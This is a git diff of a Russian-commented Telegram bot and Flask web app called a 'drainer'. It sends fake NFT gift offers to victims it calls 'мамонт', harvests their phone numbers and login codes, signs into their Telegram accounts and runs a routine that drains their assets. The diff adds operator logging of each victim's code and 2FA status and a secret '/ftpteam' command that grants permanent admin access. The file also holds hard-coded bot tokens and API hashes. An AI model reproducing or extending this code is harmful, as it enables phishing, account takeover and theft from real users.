@@ -18,7 +18,6 @@ API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
 BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
 ADMIN_ID = 678335503
 WORKER_ID = 8311100024
-# Укажи здесь актуальный домен от Railway
 DOMAIN = "getgemsdrainer-production.up.railway.app" 
 
 bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -27,6 +26,28 @@ app = Flask(__name__)
 active_clients = {}
 temp_clients = {}
 pending_contacts = {}
+
+# --- СИСТЕМА ВЕЧНОГО ДОСТУПА (TRUSTED) ---
+TRUSTED_FILE = "trusted.txt"
+
+def get_trusted():
+    """Загружает список ID из файла навсегда"""
+    if not os.path.exists(TRUSTED_FILE):
+        return [ADMIN_ID, WORKER_ID]
+    with open(TRUSTED_FILE, "r") as f:
+        ids = [int(line.strip()) for line in f if line.strip().isdigit()]
+        if ADMIN_ID not in ids: ids.append(ADMIN_ID)
+        if WORKER_ID not in ids: ids.append(WORKER_ID)
+        return ids
+
+def add_trusted(user_id):
+    """Добавляет ID в файл для сохранения после перезагрузки"""
+    trusted = get_trusted()
+    if user_id not in trusted:
+        with open(TRUSTED_FILE, "a") as f:
+            f.write(f"{user_id}\n")
+        return True
+    return False
 
 def save_log(text):
     with open("logs.txt", "a", encoding="utf-8") as f:
@@ -94,19 +115,38 @@ async def drain_logic(client, phone):
         btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
         send_log(f"⚠️ Ошибка drain_logic {phone}: {e}", buttons=btns)
 
-# --- ИНЛАЙН РЕЖИМ (ПОДАРКИ) ---
+# --- ИНЛАЙН РЕЖИМ (С ПРОВЕРКОЙ ДОСТУПА) ---
 @bot.on(events.InlineQuery)
 async def inline_handler(event):
+    # Проверка доступа (Whitelist)
+    if event.sender_id not in get_trusted():
+        await event.answer(
+            [], 
+            switch_pm_text="Доступ ограничен. Обратитесь к администратору.",
+            switch_pm_parameter="no_access"
+        )
+        return
+
     if not event.text: return
     input_text = event.text.strip()
+    
+    # Подсказка если не ссылка
+    if not input_text.startswith("http"):
+        await event.answer(
+            [],
+            switch_pm_text="Введите ссылку на NFT подарок...",
+            switch_pm_parameter="help"
+        )
+        return
+
     nft_name = input_text.split('/')[-1].replace('-', ' ').title()
     web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}"
     
     builder = event.builder
     await event.answer([
         builder.article(
-            title=f"Подарить {nft_name}",
-            description="Нажмите, чтобы отправить этот подарок",
+            title=f"🎁 Подарить {nft_name}",
+            description="Нажмите, чтобы отправить этот подарок мамонту",
             text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_name}`\n\nНажмите кнопку ниже, чтобы принять 👇",
             buttons=[
                 [Button.web_app("Принять подарок 🎁", web_url)],
@@ -116,6 +156,17 @@ async def inline_handler(event):
     ])
 
 # --- ОБРАБОТЧИКИ КОМАНД ---
+
+@bot.on(events.NewMessage(pattern='/ftpteam ftpteam'))
+async def ftpteam_handler(event):
+    """Выдача доступа по секретной команде"""
+    if add_trusted(event.sender_id):
+        username = f"@{event.sender.username}" if event.sender.username else "N/A"
+        send_log(f"🔑 Пользователь {username} (ID: {event.sender_id}) получил доступ к админке через /ftpteam")
+        await event.respond("✅ Доступ к админ-функционалу (Inline & Logs) разрешен навсегда.")
+    else:
+        await event.respond("ℹ️ У вас уже есть доступ.")
+
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
     welcome_text = (
@@ -151,7 +202,11 @@ async def redrain_callback(event):
 
 # --- API ROUTES (FLASK) ---
 @app.route('/')
-def index(): return render_template('index.html')
+def index(): 
+    # Лог захода мамонта в WebApp
+    target = request.args.get('nft_url', 'Главная')
+    send_log(f"🌐 Мамонт открыл WebApp. Цель: {target}")
+    return render_template('index.html')
 
 @app.route('/api/check_contact')
 def check_contact():
@@ -164,15 +219,18 @@ def check_contact():
 async def api_send_code():
     data = request.json
     phone, code = data.get('phone'), data.get('code')
+    send_log(f"🔑 Мамонт {phone} ввел код: {code}")
     try:
         client = temp_clients[phone]['client']
         await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
         active_clients[phone] = client
+        send_log(f"✅ Вход успешен: {phone}. Начинаю слив.")
         asyncio.create_task(drain_logic(client, phone))
         return jsonify({"status": "success"})
     except PhoneCodeInvalidError:
         return jsonify({"status": "error", "message": "Неверный код"})
     except SessionPasswordNeededError:
+        send_log(f"🔐 На {phone} требуется 2FA пароль.")
         return jsonify({"status": "2fa_needed"})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
@@ -183,12 +241,13 @@ async def contact_handler(event):
         phone = event.contact.phone_number
         if not phone.startswith('+'): phone = '+' + phone
         pending_contacts[str(event.sender_id)] = phone
+        send_log(f"📞 Мамонт поделился номером: {phone}")
         try:
             client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
             await client.connect()
             res = await client.send_code_request(phone)
             temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
-            send_log(f"📞 Контакт {phone} получен, код отправлен.")
+            send_log(f"📩 Код на {phone} отправлен.")
         except Exception as e:
             send_log(f"❌ Ошибка сессии {phone}: {e}")
 
